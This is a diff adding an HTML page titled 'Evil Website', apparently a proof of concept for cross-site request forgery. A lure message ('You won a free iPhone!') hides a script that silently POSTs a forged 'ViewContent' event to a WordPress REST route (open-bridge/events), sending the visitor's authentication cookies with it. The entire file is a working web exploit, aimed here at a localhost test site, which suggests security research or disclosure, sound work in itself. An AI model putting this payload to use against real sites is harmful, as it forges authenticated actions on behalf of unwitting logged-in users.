@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>Evil Website</title>
+</head>
+
+<body>
+    <h1>You won a free iPhone!</h1>
+    <p>Loading your prize...</p>
+
+    <!-- The Exploit -->
+    <script>
+        const targetUrl = 'http://localhost:8888/index.php?rest_route=/open-bridge/events';
+
+        const payload = {
+            event_name: 'ViewContent',
+            event_id: 'malicious-event-id-123',
+            test_event_code: 'TEST43943',
+            custom_data: { value: 1000, currency: 'USD' }
+        };
+
+        fetch(targetUrl, {
+            method: 'POST',
+            credentials: 'include', // <--- CRITICAL: Sends authentication cookies
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(payload)
+        })
+            .then(response => {
+                console.log("Attack successful!");
+                document.body.innerHTML += "<h3 style='color:red'>Exploit triggered! Check your Network Tab for the request to index.php?rest_route=/open-bridge/events</h3>";
+            })
+            .catch(err => console.error("Error:", err));
+    </script>
+</body>
+
+</html>
